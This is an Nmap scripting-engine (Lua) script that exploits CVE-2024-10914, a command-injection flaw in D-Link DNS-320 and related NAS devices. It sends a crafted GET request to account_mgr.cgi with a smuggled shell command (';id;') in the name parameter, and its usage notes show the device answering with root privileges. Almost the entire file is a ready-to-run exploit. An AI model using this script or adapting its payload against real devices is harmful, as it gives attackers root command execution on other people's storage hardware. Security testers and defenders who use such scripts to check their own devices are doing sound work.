--[[
CVE_2024-10914.nse
Attempts to exploit an HTTP vulnerability in D-Link DNS-320 and similar devices.

Categories: vuln, exploit
Author: Lexis7
--]]

local shortport = require "shortport"
local http = require "http"
local stdnse = require "stdnse"

description = [[
Exploits a vulnerability in certain D-Link DNS devices (e.g., DNS-320, DNS-320LW, DNS-325, and DNS-340L).
The script sends a crafted GET request to inject commands into the `account_mgr.cgi` endpoint.
https://vuldb.com/?id.283309
]]

---
-- @usage
-- nmap --script CVE-2024-10914_2.nse -p 80 <target>
-- @output
--| CVE-2024-10914_2:
--|   Vulnerability exploited. Response:
--|   uid=0(root) gid=0(root)
--|
--|_


author = "aka Lexis7"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "exploit"}

portrule = shortport.http

-- Vulnerable path
local path = "/cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27;id;%27"

action = function(host, port)
    -- Send the crafted HTTP GET request to the vulnerable path
    local response = http.get(host, port, path)

    -- Check if the response contains indications of successful command injection
    if response and response.body and response.status == 200 then
        return stdnse.format_output(true, "Vulnerability exploited. Response:\n" .. response.body)
    else
        return stdnse.format_output(false, "Failed to exploit the vulnerability or the device is not vulnerable.")
    end
end

